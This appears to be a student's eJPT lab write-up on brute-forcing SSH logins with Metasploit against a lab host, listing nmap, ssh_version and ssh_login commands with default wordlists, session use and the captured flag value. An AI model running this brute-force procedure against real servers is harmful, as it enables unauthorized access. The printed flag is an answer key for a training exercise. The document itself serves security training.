# L.07 - SSH Login

### Overview
- SSH (Secure Shell) is a network protocol for secure remote access over an unsecured network
- Provides encrypted communication for remote administration, file transfers, and tunneling
- Lab focuses on SSH-related Metasploit modules against a target

### Lab Environment
- Kali GUI access
- Target machine: `demo.ine.local` running SSH
- Tools: **Nmap**, **Metasploit Framework**

### Objective
Run the following auxiliary modules against the target:
- `auxiliary/scanner/ssh/ssh_version`
- `auxiliary/scanner/ssh/ssh_login`

Useful wordlists:
- `/usr/share/metasploit-framework/data/wordlists/common_users.txt`
- `/usr/share/metasploit-framework/data/wordlists/common_passwords.txt`

### Steps / Commands

1. **Check target reachability**
```bash
ping -c 4 demo.ine.local
```

2. **Nmap scan for SSH service**
```bash
nmap -sS -sV demo.ine.local
```

3. **Start Metasploit Framework**
```bash
msfconsole
```

4. **SSH version detection**
```bash
use auxiliary/scanner/ssh/ssh_version
set RHOSTS demo.ine.local
exploit
```

5. **SSH login brute-force**
```bash
use auxiliary/scanner/ssh/ssh_login
set RHOSTS demo.ine.local
set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/common_passwords.txt
set STOP_ON_SUCCESS true
set VERBOSE true
exploit
```

6. **Interact with session and find flag**
```bash
sessions
sessions -i 1
find / -name "flag"
cat /flag
```

### Flag
- **Flag:** `eb09cc6f1cd72756da145892892fbf5a`

### Key Modules
- `auxiliary/scanner/ssh/ssh_version` — SSH version detection
- `auxiliary/scanner/ssh/ssh_login` — SSH brute-force login

### eJPT Takeaway
- SSH default port is **22**
- `ssh_version` quickly identifies the SSH server version
- `ssh_login` can brute-force credentials using common wordlists
- `STOP_ON_SUCCESS true` speeds up brute-force by stopping after first valid login
- After obtaining a session, search for flags or sensitive files (`find / -name "flag"`)

### Note
- Lab reference only — IPs/domains and credentials may differ in your environment